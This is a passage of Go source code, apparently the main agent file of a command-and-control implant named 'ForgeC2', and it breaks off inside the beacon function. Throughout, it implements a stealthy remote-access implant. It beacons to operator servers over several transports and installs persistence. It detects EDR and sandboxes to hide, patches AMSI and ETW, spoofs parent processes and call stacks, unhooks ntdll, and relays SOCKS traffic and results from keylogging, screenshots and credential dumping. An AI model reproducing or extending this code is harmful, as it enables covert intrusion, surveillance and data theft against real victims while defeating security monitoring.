//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	mathRand "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/pkg/encoding"
	"github.com/forgec2/forgec2/pkg/protocol"
)

// encodeBeacon marshals a BeaconRequest using multi-format rotation.
func encodeBeacon(v any) ([]byte, error) {
	return encoding.Marshal(v)
}

// decodeBeacon unmarshals a response into BeaconResponse using multi-format detection.
func decodeBeacon(data []byte, v any) error {
	return encoding.Unmarshal(data, v)
}

// lockedRand is a mutex-guarded *mathRand.Rand. The agent reads/writes rng from
// several goroutines concurrently (beacon sender, screenshot stream, injection,
// scheduler, sleep variator), and *mathRand.Rand is not safe for concurrent use.
type lockedRand struct {
	mu sync.Mutex
	r  *mathRand.Rand
}

func (l *lockedRand) Intn(n int) int {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.r.Intn(n)
}

func (l *lockedRand) Int63n(n int64) int64 {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.r.Int63n(n)
}

func (l *lockedRand) Float64() float64 {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.r.Float64()
}

func (l *lockedRand) Uint32() uint32 {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.r.Uint32()
}

func (l *lockedRand) Uint64() uint64 {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.r.Uint64()
}

func newCryptoRand() *lockedRand {
	seed := make([]byte, 8)
	rand.Read(seed)
	src := mathRand.NewSource(int64(binary.LittleEndian.Uint64(seed)))
	return &lockedRand{r: mathRand.New(src)}
}

func init() {
	setDPIAware()
	if InitSleepMask() {
		sleepMaskActive = true
	}

	// Start EDR monitor on init
	startEdrMonitor()

	// Run sandbox detection
	go func() {
		time.Sleep(5 * time.Second) // wait for system to settle
		runSandboxCheck()
	}()

	// Environment classification (async to avoid delaying startup)
	go func() {
		time.Sleep(3 * time.Second)
		envClass, opsProfile := detectEnvironment()
		if opsProfile != nil {
			currentEnvClass = envClass
			currentOpsProfile = opsProfile
			envDetected = true
			if !opsProfile.AllowShell {
				logDebug("[env] Shell commands disabled in this environment")
			}
			if !opsProfile.AllowInjection {
				logDebug("[env] Process injection disabled in this environment")
			}
			if !opsProfile.AllowCredDump {
				logDebug("[env] Credential dumping disabled in this environment")
			}
		}
	}()

	// Apply the injected runtime config block (XOR'd JSON blob) over defaults
	// before any of the string vars are parsed below.
	loadConfigBlob()

	// Re-apply a previously delivered network config (config-over-wire) so the
	// agent starts with the operator's last-known config before re-registering.
	loadPersistedNetworkConfig()

	// Parse injected string values ( -X only supports string )
	// Multi-C2 failover: comma-separated URLs in C2URL
	parts := strings.Split(C2URL, ",")
	urls := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			urls = append(urls, p)
		}
	}
	if len(urls) == 0 {
		urls = []string{C2URL}
	}
	c2URLsStore(urls, 0)
	var err error
	Interval, err = strconv.Atoi(IntervalStr)
	if err != nil || Interval < 1 {
		Interval = 10
	}
	Jitter, err = strconv.Atoi(JitterStr)
	if err != nil {
		Jitter = 20
	}
	// Clamp jitter to [0,100]% so a >100 value can never yield a negative
	// sleep duration (which would panic time.NewTimer or cause a beacon storm).
	if Jitter < 0 {
		Jitter = 0
	}
	if Jitter > 100 {
		Jitter = 100
	}
	Persist = strings.ToLower(PersistStr) == "true" || PersistStr == "1"
	SkipTLSVerify = strings.ToLower(SkipTLSVerifyStr) == "true" || SkipTLSVerifyStr == "1"
	Debug = strings.ToLower(DebugStr) == "true" || DebugStr == "1"
	BeaconURI = BeaconURIStr
	if BeaconURI == "" {
		BeaconURI = "/api/v1/beacon"
	}
	BeaconMethod = "POST" // FORCE POST �?GET with body is unreliable in Go's http client
	BeaconTransport = BeaconTransportStr
	if BeaconTransport == "" {
		BeaconTransport = "http"
	}

	// SMB pipe name: use explicit config or extract from C2URL
	smbPipeName = SMBPipeName
	if smbPipeName == "" {
		// Try to extract from C2URL when Protocol is "smb"
		if Protocol == "smb" || strings.HasPrefix(C2URL, "smb://") {
			smbPipeName = strings.TrimPrefix(C2URL, "smb://")
		}
	}
	isSMBParent = strings.ToLower(IsSMBParentStr) == "true" || IsSMBParentStr == "1"

	if Debug {
		fmt.Printf("[DEBUG] BeaconURI=%q BeaconMethod=%q C2URL=%q SMBPipeName=%q\n", BeaconURI, BeaconMethod, C2URL, smbPipeName)
	}
	if id, err := strconv.ParseUint(ListenerIDStr, 10, 32); err == nil {
		ListenerID = uint(id)
	}

	evasionEnabled = strings.ToLower(EvasionStr) == "true" || EvasionStr == "1"
	if v := os.Getenv("FORGEC2_EVASION"); v == "1" || strings.ToLower(v) == "true" {
		evasionEnabled = true
	}

	ghostModeEnabled = strings.ToLower(GhostModeStr) == "true" || GhostModeStr == "1"
	if v := os.Getenv("FORGEC2_GHOST_MODE"); v == "1" || strings.ToLower(v) == "true" {
		ghostModeEnabled = true
	}

	// Adaptive EDR detection: detect running EDR and apply optimal evasion strategy
	edrInfo := DetectEDR()
	strategy := edrInfo.GetStrategy()
	ApplyStrategy(strategy)
	if edrInfo.Detected && Debug {
		fmt.Printf("[EDR] Detected %s, applied strategy\n", edrInfo.Name)
	}

	// Anti-debug detection: early check before beaconing starts
	if runtime.GOOS == "windows" {
		score, details := AntiDebugCheck()
		antiDebugScore = score
		if score > 20 {
			antiDebugTriggered = true
			logDebugf("[antidebug] Detection score: %d/%d checks triggered", score, len(details))
			if score > 50 {
				enterGhostMode("anti-debug threshold exceeded")
			} else {
				patchAMSI = false
				patchETW = false
			}
		}
		go runAntiDebugMonitor()
	}

	ppidSpoofEnabled = strings.ToLower(PPIDSpoofStr) == "true" || PPIDSpoofStr == "1"
	if v := os.Getenv("FORGEC2_PPID_SPOOF"); v == "1" || strings.ToLower(v) == "true" {
		ppidSpoofEnabled = true
	}
	if ppidSpoofEnabled {
		ppidSpoofParent = PPIDSpoofParent
		if v := os.Getenv("FORGEC2_PPID_PARENT"); v != "" {
			ppidSpoofParent = v
		}
		if ppidSpoofParent == "" {
			ppidSpoofParent = "explorer.exe"
		}
	}

	egressDetection = strings.ToLower(EgressDetectionStr) == "true" || EgressDetectionStr == "1"

	chameleonEnabled = strings.ToLower(ChameleonStr) == "true" || ChameleonStr == "1"
	chameleonProfile = ChameleonProfileStr
	if chameleonProfile == "" {
		chameleonProfile = "random"
	}

	persistencePrefix = PersistencePrefixStr
	if persistencePrefix == "" {
		persistencePrefix = "ForgeC2"
	}
	if v := os.Getenv("FORGEC2_PERSIST_PREFIX"); v != "" {
		persistencePrefix = v
	}

	// Derive transport artifact names from the (operator-controlled) persistence
	// prefix so the compiled implant never ships the literal "forgec2" as a pipe
	// name or SSH username — those are trivial network/process IOCs.
	if SMBPipeName == "" {
		SMBPipeName = persistencePrefix
	}
	if SSHUserStr == "" {
		SSHUserStr = persistencePrefix
	}

	// Certificate pinning
	initTLSPinning()

	// SSH transport config
	initSSHConfig()

	// mTLS transport config
	initMTLS()

	// Initialize CLR (.NET) hosting for in-process assembly execution
	if runtime.GOOS == "windows" {
		useCLRHosting = initCLRHosting()
	}

	// Initialize v2 beacon crypto: persistent identity key + ephemeral ECDH session.
	// v2 has no legacy XOR/plaintext beacon path — encryption is mandatory.
	loadOrCreateIdentityKey()
	sess, err := newECDSession()
	if err == nil {
		ecdhSess = sess
	}

	// Expiry date check: exit if expired
	if ExpiryDateStr != "" {
		kd, err := time.Parse("2006-01-02", ExpiryDateStr)
		if err == nil && time.Now().After(kd) {
			debugLog("Expiry date reached, exiting.")
			os.Exit(0)
		}
	}

	// Parse multi-C2 mode
	switch strings.ToLower(C2ModeStr) {
	case "failover":
		c2Mode = C2ModeFailover
	case "roundrobin", "round_robin":
		c2Mode = C2ModeRoundRobin
	case "random":
		c2Mode = C2ModeRandom
	case "split":
		c2Mode = C2ModeSplit
	case "parallel":
		c2Mode = C2ModeParallel
	default:
		c2Mode = C2ModeSingle
	}

	if mr, err := strconv.Atoi(MaxRetriesStr); err == nil {
		maxRetries = mr
	} else {
		maxRetries = 10
	}

	if dt, err := strconv.Atoi(DeadTimeoutStr); err == nil {
		deadTimeout = time.Duration(dt) * time.Second
	} else {
		deadTimeout = 3600 * time.Second
	}

	c2Stats = make(map[int]*c2FailStats)

	// Parse gossip config
	GossipEnabled = strings.ToLower(GossipEnabledStr) == "true" || GossipEnabledStr == "1"
	if gi, err := strconv.Atoi(GossipIntervalStr); err == nil && gi > 0 {
		GossipInterval = gi
	} else {
		GossipInterval = 30
	}
	// If gossip listen addr not set, derive from P2PListenAddr by incrementing port
	if GossipEnabled && GossipListenAddr == "" && P2PListenAddr != "" {
		if host, portStr, err := net.SplitHostPort(P2PListenAddr); err == nil {
			if port, err := strconv.Atoi(portStr); err == nil {
				GossipListenAddr = fmt.Sprintf("%s:%d", host, port+1)
			}
		}
	}

	// Working hours
	workingStart = WorkingStartStr
	workingEnd = WorkingEndStr
	workingTZ = WorkingTZStr

	// Kill date
	if KillDateStr != "" {
		if kd, err := time.Parse("2006-01-02", KillDateStr); err == nil {
			killDateParsed = kd
		}
	}

	// All HTTPS egress uses the utls dialer so the ClientHello is a realistic,
	// configurable fingerprint (Chrome Auto by default; the chameleon build
	// rotates it) instead of the Go-stdlib stack.
	tr := newUTLSTransport()
	if ProxyStr != "" {
		proxyURL, err := url.Parse(ProxyStr)
		if err == nil {
			tr.Proxy = http.ProxyURL(proxyURL)
		}
	}
	client = &http.Client{
		Transport: tr,
		Timeout:   30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

func verifySelfIntegrity() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	exePath, err = filepath.EvalSymlinks(exePath)
	if err != nil {
		return
	}
	data, err := os.ReadFile(exePath)
	if err != nil {
		return
	}
	// The expected hash is of the binary EXCLUDING the embedded self-hash
	// string itself (which the builder patches in after hashing). Locate the
	// embedded hash region, zero it, and hash the rest so a tampered binary
	// (any change outside that region) fails verification.
	calc := make([]byte, len(data))
	copy(calc, data)
	needle := []byte(SelfCheckSHA256Str)
	if idx := bytes.Index(calc, needle); idx >= 0 {
		for i := idx; i < idx+len(needle) && i < len(calc); i++ {
			calc[i] = 0
		}
	}
	h := sha256.Sum256(calc)
	actual := hex.EncodeToString(h[:])
	if actual != SelfCheckSHA256Str {
		os.Exit(1)
	}
}

func main() {
	log.SetFlags(0)
	if !Debug {
		log.SetOutput(io.Discard)
		os.Stdout, _ = os.Open(os.DevNull)
		os.Stderr, _ = os.Open(os.DevNull)
	}

	if SelfCheckSHA256Str != "" {
		verifySelfIntegrity()
	}

	setDPIAware()
	if Debug {
		fmt.Println(s(SForgeC2), "Agent starting...")
	}

	if Persist {
		addPersistence()
	}

	// Sandbox detection ? run once at startup
	detector := NewSandboxDetector()
	result := detector.Detect()
	inSandbox = result.IsSandbox
	if inSandbox {
		logDebugf("Sandbox detected (confidence: %d%%), entering benign mode", result.Confidence)
	}

	// Initial registration / first beacon
	agentUUID = registerOrGetUUID()

	// Protocol state: registration key. v3 uses a per-implant secret compiled
	// into this binary (never the fleet master key); v2 derives from the
	// compiled-in beacon key. Never transmitted; persisted sequence +
	// registered marker so a restart continues the same session timeline.
	agentRegKey = loadAgentRegKey()
	loadBeaconState()

	// Mark as SMB child if using SMB transport
	if Protocol == "smb" || BeaconTransport == "smb" {
		isSMBChild = true
		if Debug {
			fmt.Printf(s(SForgeC2)+" SMB child mode, pipe: %s\n", smbPipeName)
		}
	}

	// Start SMB parent pipe listener if configured
	if isSMBParent && smbPipeName != "" {
		if err := StartSMBParentPipe(smbPipeName); err != nil {
			if Debug {
				fmt.Printf("[!] SMB parent pipe start failed: %v\n", err)
			}
		} else {
			go p2pCleanupStaleChildren()
		}
	}

	// Start P2P parent listener if in parent mode
	if P2PMode != "" && P2PListenAddr != "" {
		go p2pParentListen()
		go p2pCleanupStaleChildren()
		if Debug {
			fmt.Printf(s(SForgeC2)+" P2P parent mode (%s) on %s\n", P2PMode, P2PListenAddr)
		}
	}

	// JIT Beacon Scheduler
	if runtime.GOOS == "windows" {
		getBeaconScheduler()
	}

	// Start gossip protocol for P2P mesh auto-routing
	if GossipEnabled {
		go startGossipProtocol()
		if GossipListenAddr != "" {
			go gossipListen()
			if Debug {
				fmt.Printf(s(SForgeC2)+" Gossip listener on %s\n", GossipListenAddr)
			}
		}
	}

	// Run egress detection on first startup if configured
	if Protocol != "smb" && (BeaconTransport == "auto" || egressDetection) {
		c2Host := extractC2Host()
		ports := parseEgressPorts()
		if Debug {
			fmt.Printf("[egress] Running egress detection against %s ports %v\n", c2Host, ports)
		}
		report := runEgressDetection(c2Host, ports)
		egressReport = report
		egressDetected = true
		if report.Best != "" {
			bestEgressProto = report.Best
			if Debug {
				fmt.Printf("[egress] Best protocol: %s\n", bestEgressProto)
			}
			switch {
			case strings.HasPrefix(bestEgressProto, "tcp/"):
				Protocol = "tcp"
			case bestEgressProto == "dns":
				Protocol = "dns"
			case bestEgressProto == "icmp":
				Protocol = "icmp"
			}
		}
	}

	// Main beacon loop
	startTaskWorker()
	beaconCount := 0
	for {
		// Kill date check: exit if expired
		if !killDateParsed.IsZero() && time.Now().After(killDateParsed) {
			if Debug {
				fmt.Println("[*] Kill date reached, exiting.")
			}
			os.Exit(0)
		}

		// Ghost mode: send final beacon, then sleep
		if isInGhostMode() {
			if !ghostBeaconSent {
				ghostBeaconSent = true
				doBeacon()
			}
			time.Sleep(24 * time.Hour)
			continue
		}

		// Check triggers before beacon (Windows only)
		if runtime.GOOS == "windows" && beaconSched != nil {
			beaconSched.CheckTriggers()
		}

		doBeacon()
		beaconCount++

		// Exponential backoff on consecutive beacon failures
		if beaconConsecutiveFailures > 0 {
			backoffSec := beaconBackoffSec(beaconConsecutiveFailures)
			// Add jitter: ±25%
			jitterRange := backoffSec / 4
			if jitterRange > 0 {
				backoffSec += int(mathRand.Int31n(int32(2*jitterRange+1))) - jitterRange
			}
			if Debug {
				fmt.Printf("[!] Beacon backoff: sleeping %ds (failures=%d)\n", backoffSec, beaconConsecutiveFailures)
			}
			time.Sleep(time.Duration(backoffSec) * time.Second)
			continue
		}

		// Notify scheduler after beacon
		if runtime.GOOS == "windows" && beaconSched != nil {
			beaconSched.AfterBeacon()
		}

		// Deliver task results immediately instead of waiting a full sleep cycle.
		pendingMu.Lock()
		hasPending := len(pendingResults) > 0 || len(pendingTaskAcks) > 0
		pendingMu.Unlock()
		if hasPending {
			continue
		}

		// Working hours check: if outside working hours, sleep until next window
		if workingStart != "" && workingEnd != "" {
			if !isWithinWorkingHours() {
				sleepDuration := timeUntilNextWindow()
				if Debug {
					fmt.Printf("[working] Outside working hours (%s-%s), sleeping %v\n", workingStart, workingEnd, sleepDuration)
				}
				if sleepDuration < 0 {
					sleepDuration = 0
				}
				time.Sleep(sleepDuration)
				continue
			}
		}

		sleepWithJitter()
	}
}

func sleepWithJitter() {
	// Use sleep variator for non-default modes
	mode := getSleepMode()
	if mode != SleepModeDefault && mode != SleepModeInteractive {
		duration := computeSleepDuration()
		if sleepMaskActive {
			sleepWithMask(duration)
			return
		}
		if evasionEnabled {
			sleepObfuscated(duration)
			return
		}
		time.Sleep(duration)
		return
	}

	// Use JIT scheduler on Windows if available
	if runtime.GOOS == "windows" && beaconSched != nil {
		if beaconSched.ShouldBeaconNow() {
			return
		}
		duration := beaconSched.ComputeNext()

		if sleepMaskActive {
			sleepWithMask(duration)
			return
		}
		if evasionEnabled {
			sleepObfuscated(duration)
			return
		}
		time.Sleep(duration)
		return
	}

	// Interval 0 = interactive mode (tight beacon loop for shell/UI).
	if Interval <= 0 {
		d := 200 * time.Millisecond
		if inFastMode.Load() {
			d = 50 * time.Millisecond
		}
		waitForBeaconWake(d)
		return
	}
	baseInterval := Interval
	if inFastMode.Load() {
		baseInterval = FastInterval
	}
	base := time.Duration(baseInterval) * time.Second
	jit := float64(Jitter) / 100.0
	variation := time.Duration(float64(base) * jit * (rng.Float64()*2 - 1))

	// If Sleep Mask is initialized, use encrypted sleep
	if sleepMaskActive {
		sleepWithMask(base + variation)
		return
	}
	if evasionEnabled {
		sleepObfuscated(base + variation)
		return
	}
	waitForBeaconWake(base + variation)
}

func waitForBeaconWake(duration time.Duration) {
	// Guard against non-positive durations (e.g. extreme negative jitter) which
	// would panic time.NewTimer or busy-loop. Interactive fast mode legitimately
	// passes sub-second values, so only floor at zero here.
	if duration < 0 {
		duration = 0
	}
	// Cover traffic: sprinkle decoy requests to the C2 listener at a random
	// point inside the sleep window so the beacon cadence is less regular.
	// getActiveCoverTraffic() returns false unless an operator opted in.
	if duration > 0 {
		if enabled, _ := getActiveCoverTraffic(); enabled {
			go func() {
				d := time.Duration(mathRand.Int63n(int64(duration)))
				time.Sleep(d)
				sendCoverTrafficBurst()
			}()
		}
	}
	timer := time.NewTimer(duration)
	defer timer.Stop()
	select {
	case <-timer.C:
	case <-beaconWake:
	}
}

func checkFastMode(tasks []Task) {
	inFastMode.Store(false)
	fastTypes := map[string]bool{
		"screenshot": true, "screenshot_window": true, "shell": true, "ps": true,
		"clipboard_get": true, "clipboard_set": true, "find": true, "drives": true,
		"services": true, "beacon_now": true, "ls": true, "read": true,
	}
	for _, task := range tasks {
		if fastTypes[task.Type] {
			inFastMode.Store(true)
			return
		}
	}
}

func registerOrGetUUID() string {
	uuidFile := getUUIDFilePath()
	if data, err := os.ReadFile(uuidFile); err == nil && len(data) > 0 {
		return strings.TrimSpace(string(data))
	}
	// Generate new using crypto/rand (RFC 4122 compliant)
	var buf [16]byte
	if _, err := rand.Read(buf[:]); err == nil {
		buf[6] = (buf[6] & 0x0f) | 0x40 // version 4
		buf[8] = (buf[8] & 0x3f) | 0x80 // variant 10
		newUUID := fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
			buf[0:4], buf[4:6], buf[6:8], buf[8:10], buf[10:16])
		os.WriteFile(uuidFile, []byte(newUUID), 0o600)
		if runtime.GOOS == "windows" {
			setHidden(uuidFile)
		}
		return newUUID
	}
	// Fallback (should never happen)
	newUUID := fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		rng.Uint32(), rng.Uint32()&0xffff, rng.Uint32()&0xffff|0x4000,
		rng.Uint32()&0x3fff|0x8000, rng.Uint64())
	os.WriteFile(uuidFile, []byte(newUUID), 0o600)
	if runtime.GOOS == "windows" {
		setHidden(uuidFile)
	}
	return newUUID
}

// getUUIDFilePath returns a dedicated, agent-private path for UUID persistence.
// It MUST NOT reuse or overwrite system files (e.g. /var/lib/dbus/machine-id or
// the cfprefs plist): doing so corrupts host services and makes the agent UUID
// predictable. The UUID lives in a hidden subdirectory of the user cache dir.
func getUUIDFilePath() string {
	base, err := os.UserCacheDir()
	if err != nil || base == "" {
		if runtime.GOOS == "windows" {
			base = os.Getenv("LOCALAPPDATA")
		} else {
			base = os.Getenv("HOME")
		}
		if base == "" {
			base = "."
		}
	}
	dir := agentStateDir(base)
	_ = os.MkdirAll(dir, 0o700)
	return filepath.Join(dir, "agent.uuid")
}

// agentStateDir returns a per-implant, non-default data directory name. The
// static ".forgec2" name is a trivial filesystem IOC; instead we derive a
// stable, unpredictable directory from the injected registration secret (or,
// as a fallback, other compile-time injected constants) so different implants
// use different directory names while remaining stable across restarts.
func agentStateDir(base string) string {
	seed := RegSecretStr
	if seed == "" {
		seed = C2URL + UserAgent + BeaconURI
	}
	sum := sha256.Sum256([]byte(seed))
	return filepath.Join(base, "."+hex.EncodeToString(sum[:])[:12])
}

// sanitizeLabel returns a filesystem/label-safe identifier derived from s by
// replacing any run of characters outside [A-Za-z0-9._-] with a single dot. It
// is used to turn the operator-controlled persistence prefix into valid plist
// labels, .desktop filenames and systemd unit names without shipping "forgec2".
func sanitizeLabel(s string) string {
	var b strings.Builder
	prevDot := false
	for _, r := range s {
		if (r >= 'A' && r <= 'Z') || (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') || r == '.' || r == '_' || r == '-' {
			b.WriteRune(r)
			prevDot = false
		} else if !prevDot {
			b.WriteRune('.')
			prevDot = true
		}
	}
	out := b.String()
	if out == "" || out == "." {
		out = "agent"
	}
	return out
}

// getBeaconStateFilePath returns the persistence path for v2 protocol state
// (frame sequence, registration marker), stored alongside the identity key.
func getBeaconStateFilePath(name string) string {
	return filepath.Join(filepath.Dir(getUUIDFilePath()), name)
}

// loadBeaconState restores the persisted frame sequence and registration
// marker. The sequence must never go backwards or the server (which persists
// last_seq) would reject our frames as replays.
func loadBeaconState() {
	seqMu.Lock()
	defer seqMu.Unlock()
	if data, err := os.ReadFile(getBeaconStateFilePath("beacon.seq")); err == nil {
		if v, err := strconv.ParseUint(strings.TrimSpace(string(data)), 10, 64); err == nil {
			beaconSeq = v
		}
	}
	if data, err := os.ReadFile(getBeaconStateFilePath("registered")); err == nil {
		registered = strings.TrimSpace(string(data)) == "1"
	}
}

// persistBeaconState saves the current frame sequence and registration marker.
func persistBeaconState() {
	seqMu.Lock()
	seq := beaconSeq
	reg := registered
	seqMu.Unlock()
	path := getBeaconStateFilePath("beacon.seq")
	if err := os.WriteFile(path, []byte(strconv.FormatUint(seq, 10)), 0600); err == nil && runtime.GOOS == "windows" {
		setHidden(path)
	}
	if reg {
		rp := getBeaconStateFilePath("registered")
		if err := os.WriteFile(rp, []byte("1"), 0600); err == nil && runtime.GOOS == "windows" {
			setHidden(rp)
		}
	}
}

// reparseNetworkConfig re-derives the network-relevant runtime globals from the
// current *Str values. It is called after a server-delivered network config
// (config-over-wire) is applied so the changes take effect immediately. It only
// touches the network globals — EDR/SSH/mTLS init is not delivered dynamically
// and is intentionally left untouched.
func reparseNetworkConfig() {
	parts := strings.Split(C2URL, ",")
	urls := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			urls = append(urls, p)
		}
	}
	if len(urls) == 0 {
		urls = []string{C2URL}
	}
	c2URLsStore(urls, 0)
	var err error
	Interval, err = strconv.Atoi(IntervalStr)
	if err != nil || Interval < 1 {
		Interval = 10
	}
	Jitter, err = strconv.Atoi(JitterStr)
	if err != nil {
		Jitter = 20
	}
	if Jitter < 0 {
		Jitter = 0
	}
	if Jitter > 100 {
		Jitter = 100
	}
	SkipTLSVerify = strings.ToLower(SkipTLSVerifyStr) == "true" || SkipTLSVerifyStr == "1"
	BeaconURI = BeaconURIStr
	if BeaconURI == "" {
		BeaconURI = "/api/v1/beacon"
	}
	BeaconTransport = BeaconTransportStr
	if BeaconTransport == "" {
		BeaconTransport = "http"
	}
	if id, perr := strconv.ParseUint(ListenerIDStr, 10, 32); perr == nil {
		ListenerID = uint(id)
	}
	smbPipeName = SMBPipeName
	if smbPipeName == "" {
		if Protocol == "smb" || strings.HasPrefix(C2URL, "smb://") {
			smbPipeName = strings.TrimPrefix(C2URL, "smb://")
		}
	}
}

// nextBeaconSeq allocates the next frame sequence number.
func nextBeaconSeq() uint64 {
	seqMu.Lock()
	defer seqMu.Unlock()
	beaconSeq++
	return beaconSeq
}

func startTaskWorker() {
	taskWorkerOnce.Do(func() {
		for i := 0; i < defaultTaskWorkers; i++ {
			go workerLoop()
		}
	})
}

// enqueueTask hands a task to the execution pool without blocking the beacon
// goroutine. When the queue is saturated the oldest waiting task is evicted
// (and returned as an error result) so fresh commands are always accepted.
func enqueueTask(task Task) {
	if !insertTask(task) {
		// Extremely rare: the queue stayed full through the eviction attempts.
		// Ack the delivery so the server never re-fetches it, and surface a
		// terminal error so the task is not left "running" forever.
		pendingMu.Lock()
		pendingTaskAcks = append(pendingTaskAcks, task.ID)
		pendingMu.Unlock()
		enqueueResult(TaskResult{
			TaskID: task.ID,
			Type:   task.Type,
			Error:  "task not accepted: queue busy",
		})
		return
	}
	pendingMu.Lock()
	pendingTaskAcks = append(pendingTaskAcks, task.ID)
	pendingMu.Unlock()
}

// insertTask places task on the queue, freeing a slot by evicting the oldest
// waiting task first if it is full. Returns false if an empty slot could not be
// found (only possible under heavy contention).
func insertTask(task Task) bool {
	for i := 0; i < 2; i++ {
		select {
		case taskQueue <- task:
			return true
		default:
		}
		select {
		case evicted := <-taskQueue:
			evictQueuedTask(evicted)
		default:
		}
	}
	return false
}

// evictQueuedTask acks the evicted task (it was delivered) and enqueues a
// terminal error result so the server marks it failed instead of leaving it
// running forever.
func evictQueuedTask(task Task) {
	pendingMu.Lock()
	pendingTaskAcks = append(pendingTaskAcks, task.ID)
	pendingMu.Unlock()
	enqueueResult(TaskResult{
		TaskID: task.ID,
		Type:   task.Type,
		Error:  fmt.Sprintf("task evicted before start: execution queue full (%d slots)", maxQueuedTasks),
	})
}

const (
	// maxPendingResults bounds the in-memory result queue. A high-volume
	// producer (keylogger, screen capture, relayed frames) cannot grow memory
	// without bound; when full the oldest result is dropped.
	maxPendingResults = 1024
	// maxPendingResultBytes drops a single oversized result (e.g. a multi-MB
	// screenshot) outright so it cannot produce a beacon the server rejects.
	maxPendingResultBytes = 16 * 1024 * 1024
	// maxP2PChildFrames / maxP2PChildFrameBytes bound the per-child relay queue.
	maxP2PChildFrames     = 256
	maxP2PChildFrameBytes = 8 * 1024 * 1024
)

// enqueueResult appends a task result to the pending queue, bounding it so a
// high-volume producer cannot exhaust memory. When the queue is full the oldest
// result is dropped; a single result larger than maxPendingResultBytes is
// dropped outright (it would otherwise build a beacon the server rejects).
func enqueueResult(r TaskResult) {
	pendingMu.Lock()
	defer pendingMu.Unlock()
	if len(r.Output) > maxPendingResultBytes {
		if Debug {
			fmt.Printf("[!] dropping oversized task result (type=%s size=%d)\n", r.Type, len(r.Output))
		}
		return
	}
	if len(pendingResults) >= maxPendingResults {
		pendingResults = pendingResults[1:]
	}
	pendingResults = append(pendingResults, r)
}

// enqueueResults appends several results, applying the same bounds as
// enqueueResult to each.
func enqueueResults(results []TaskResult) {
	for _, r := range results {
		enqueueResult(r)
	}
}

func availableTaskCapacity() int {
	return cap(taskQueue) - len(taskQueue)
}

func doBeacon() {
	// Continuously defeat EDRs that re-instrument ntdll between beacons by
	// re-applying the clean .text from disk each cycle (no-op until an operator
	// enables unhooking via the unhook_ntdll task).
	reapplyNtdllUnhook()

	info := getSystemInfo()

	// Collect pending SOCKS relay data
	socksData := socksCollectOutbound()
	if len(socksData) > 0 {
		inFastMode.Store(true) // fast poll while SOCKS is active
	}

	// Collect rportfwd data alongside SOCKS frames
	rpfData := rportfwdCollectOutbound()
	if len(rpfData) > 0 {
		socksData = append(socksData, rpfData...)
		inFastMode.Store(true)
	}

	// Collect P2P child results to relay
	p2pRelayMu.Lock()
	relayedResults := make([]RelayedData, 0)
	for _, childUUID := range p2pChildUUIDs {
		results := p2pChildResults[childUUID]
		acks := p2pChildAcks[childUUID]
		if len(results) > 0 || len(acks) > 0 {
			relayedResults = append(relayedResults, RelayedData{
				AgentID:    childUUID,
				Results:    results,
				AckTaskIDs: acks,
			})
			delete(p2pChildResults, childUUID)
			delete(p2pChildAcks, childUUID)
		}
	}
	p2pRelayMu.Unlock()

	// Append gossip peer table to results if enabled (throttled)
	if GossipEnabled && time.Since(lastGossipReport) > 30*time.Second {
		peerTableMu.RLock()
		peers := make([]PeerInfo, 0, len(peerTable))
		for _, p := range peerTable {
			peers = append(peers, p)
		}
		peerTableMu.RUnlock()
		if len(peers) > 0 {
			if data, err := json.Marshal(peers); err == nil {
				enqueueResult(TaskResult{
					Type:   "gossip_discover",
					Output: string(data),
				})
				lastGossipReport = time.Now()
			}
		}
	}

	pendingMu.Lock()
	resultsCopy := pendingResults
	acksCopy := pendingTaskAcks
	pendingResults = nil // sent
	pendingTaskAcks = nil
	pendingMu.Unlock()

	taskCapacity := availableTaskCapacity()
	req := BeaconRequest{
		UUID:            agentUUID,
		ProtocolVersion: CurrentProtocolVersion,
		AgentVersion:    AgentVersion,
		Info:            info,
		Results:         resultsCopy,
		AckTaskIDs:      acksCopy,
		TaskCapacity:    &taskCapacity,
		SocksData:       socksData,
		Relayed:         relayedResults,
		RelayedFrames:   p2pDrainChildFrames(),
	}

	body, _ := json.Marshal(req)

	// Decide frame type and build the v2 envelope. Encryption failures MUST NOT
	// fall back to plaintext (defeats encryption / leaks beacon data); drop the
	// beacon so the data stays queued for the next attempt.
	sendBody, frameKind, frameSeq, ok := buildBeaconEnvelope(body)
	if !ok {
		if Debug {
			fmt.Printf("[!] Beacon encryption failed, dropping beacon (no plaintext fallback)\n")
		}
		pendingMu.Lock()
		pendingResults = append(resultsCopy, pendingResults...)
		pendingTaskAcks = append(acksCopy, pendingTaskAcks...)
		pendingMu.Unlock()
		beaconConsecutiveFailures++
		return
	}

	// Apply traffic shape analysis and adaptation
	sendBody = applyTrafficShaping(sendBody)

	// P2P child mode: beacon through parent instead of server. The whole
	// transport dispatch runs on a (Windows) native thread with a spoofed
	// call stack when useStackSpoofing is active, hiding the implant's Go
	// routines from userland stack-walk based EDR attribution.
	var respBody []byte
	runBeaconSendSpoofed(func() {
		switch {
		case P2PParent != "":
			respBody = sendP2PBeacon(sendBody)
		case Protocol == "smb" || BeaconTransport == "smb":
			respBody = sendSMBBeacon(sendBody)
		case Protocol == "tcp":
			respBody = sendTCPBeacon(sendBody)
		case Protocol == "dns":
			respBody = sendDNSBeacon(sendBody)
			if respBody == nil {
				dnsConsecutiveFailures++
				if Debug {
					fmt.Printf("[!] DNS beacon failed (%d/%d consecutive failures)\n", dnsConsecutiveFailures, dnsFallbackThreshold)
				}
